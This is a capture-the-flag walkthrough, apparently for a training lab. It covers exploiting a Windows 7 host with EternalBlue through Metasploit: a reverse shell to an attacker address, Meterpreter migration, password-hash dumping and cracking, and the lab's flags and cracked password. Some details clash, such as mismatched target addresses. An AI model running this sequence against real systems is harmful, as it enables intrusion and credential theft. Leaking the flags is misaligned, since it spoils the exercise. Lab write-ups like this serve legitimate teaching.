# **Step-by-Step Analysis of Windows 7 EternalBlue Exploitation**  

---

### **1. Initial Reconnaissance with Nmap**  
**Command:**  
```bash
nmap -sV -vv --script vuln 10.10.27.187
```  
**Findings:**  
- Open ports:  
  - **135/tcp** (MSRPC)  
  - **139/tcp** (NetBIOS)  
  - **445/tcp** (SMB)  
  - **3389/tcp** (RDP)  
  - High-numbered RPC ports (49152-49160)  
- OS: **Windows 7 Professional 7601 Service Pack 1 x64**  
- **Critical Vulnerability:** `MS17-010 (EternalBlue)`  

> **Explanation:**  
> This command performs a verbose (-vv) version scan (-sV) on the target IP and runs vulnerability scripts (`--script vuln`) to detect known weaknesses. Nmap identifies SMB (port 445) is open and vulnerable to EternalBlue (MS17-010), which is a serious remote code execution flaw in Microsoft's SMB protocol.

---

### **2. Exploitation with Metasploit**  
#### **Setting Up the Exploit**  
```bash
msfconsole  
search ms17  
use exploit/windows/smb/ms17_010_eternalblue  
set payload windows/x64/shell/reverse_tcp  
set LHOST 10.17.7.111  
set LPORT 4444  
set RHOSTS 10.10.20.168  
run  
```  

> **Explanation:**  
> Here, Metasploit Framework (`msfconsole`) is used to launch the EternalBlue exploit module. You select an appropriate payload (reverse shell for 64-bit Windows) and configure the listener's IP and port (`LHOST`, `LPORT`). `RHOSTS` is the target IP. Running the exploit attempts to trigger the vulnerability and open a reverse shell back to the attacker machine.

#### **Successful Exploitation**  
- Established a **reverse shell** as **NT AUTHORITY\SYSTEM**  
- **Meterpreter session opened** (`10.17.7.111:4444 → 10.10.20.168:49179`)  

> **Explanation:**  
> The reverse shell connects back from the victim to attacker, giving the attacker a command shell with SYSTEM privileges — the highest level on Windows. Meterpreter is an advanced shell provided by Metasploit that allows more complex interaction with the target.

---

### **3. Post-Exploitation Activities**  
#### **Upgrading Shell to Meterpreter**  
```bash
background  
use post/multi/manage/shell_to_meterpreter  
set session 1  
run  
```  
- **New Meterpreter session (ID: 2)** opened on port **4433**  

> **Explanation:**  
> The initial shell might be a basic command shell. Upgrading it to Meterpreter provides more control and functionality. This post-exploitation module converts the existing shell session into a Meterpreter session.

#### **Checking Active Sessions**  
```bash
sessions  
```  
**Output:**  
```
Active sessions
===============
  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         shell x64/windows        Shell Banner: Microsoft...  10.17.7.111:4444 → 10.10.20.168:49179
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.17.7.111:4433 → 10.10.20.168:49202
```  

> **Explanation:**  
> Lists all active sessions; confirms the Meterpreter session is running alongside the initial shell.

#### **Migrating to a Stable Process**  
```bash
sessions -i 2  
ps  
migrate 1304  # (spoolsv.exe - a stable SYSTEM process)  
getuid  
```  
**Output:**  
```
Server username: NT AUTHORITY\SYSTEM  
```  

> **Explanation:**  
> Migrating to a stable system process like `spoolsv.exe` helps keep the session alive if the original exploited process crashes or is closed. `getuid` confirms that the session still runs with SYSTEM privileges.

---

### **4. Dumping Password Hashes**  
```bash
hashdump  
```  
**Output:**  
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::  
```  

> **Explanation:**  
> The `hashdump` command extracts NTLM password hashes from the system’s Security Account Manager (SAM) database. These hashes can be cracked offline to recover plaintext passwords.

#### **Cracking Jon’s Password with John the Ripper**  
```bash
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hashblue  
john hashblue --format=NT --wordlist=/usr/share/wordlists/rockyou.txt  
```  
**Cracked Password:** `alqfna22`  

> **Explanation:**  
> The extracted hash is saved into a file and cracked using John the Ripper with a popular password wordlist (rockyou.txt). This recovers the actual password `alqfna22` for the user Jon.

---

### **5. Finding the Flags**  
#### **Flag 1 (Basic Access)**  
```bash
cd C:\  
cat flag1.txt  
```  
**Output:**  
`flag{access_the_machine}`  

#### **Flag 2 (SAM Database Access)**  
```bash
cd C:\windows\system32\config  
cat flag2.txt  
```  
**Output:**  
`flag{sam_database_elevated_access}`  

#### **Flag 3 (User Documents)**  
```bash
cd C:\users\Jon\Documents  
cat flag3.txt  
```  
**Output:**  
`flag{admin_documents_can_be_valuable}`  

> **Explanation:**  
> The flags are placed in typical locations to validate different privilege levels: basic machine access, system registry/SAM files, and user document folders. Reading these confirms full system control.

---

### **Summary of Commands Used**  
| **Action** | **Command** |
|------------|------------|
| Nmap Scan | `nmap -sV -vv --script vuln 10.10.27.187` |
| Metasploit Setup | `use exploit/windows/smb/ms17_010_eternalblue` |
| Set Payload | `set payload windows/x64/shell/reverse_tcp` |
| Set LHOST | `set LHOST 10.17.7.111` |
| Set RHOST | `set RHOSTS 10.10.20.168` |
| Run Exploit | `run` |
| Upgrade Shell | `use post/multi/manage/shell_to_meterpreter` |
| Check Sessions | `sessions` |
| Migrate Process | `migrate 1304` |
| Dump Hashes | `hashdump` |
| Crack Password | `john hashblue --format=NT --wordlist=/usr/share/wordlists/rockyou.txt` |
| Find Flag 1 | `cat C:\flag1.txt` |
| Find Flag 2 | `cat C:\windows\system32\config\flag2.txt` |
| Find Flag 3 | `cat C:\users\Jon\Documents\flag3.txt` |

---

### **Final Notes**  
- **EternalBlue (MS17-010)** allowed full system takeover.  
- **Password reuse** made cracking easy (`alqfna22`).  
- **Flags** were placed in **common privilege escalation paths**.  
- **Process migration** (`spoolsv.exe`) ensured persistence.  

This demonstrates how **unpatched systems** can be **fully compromised** with known exploits.

---

**"this is how you create this is done by deepseek after your failure"**
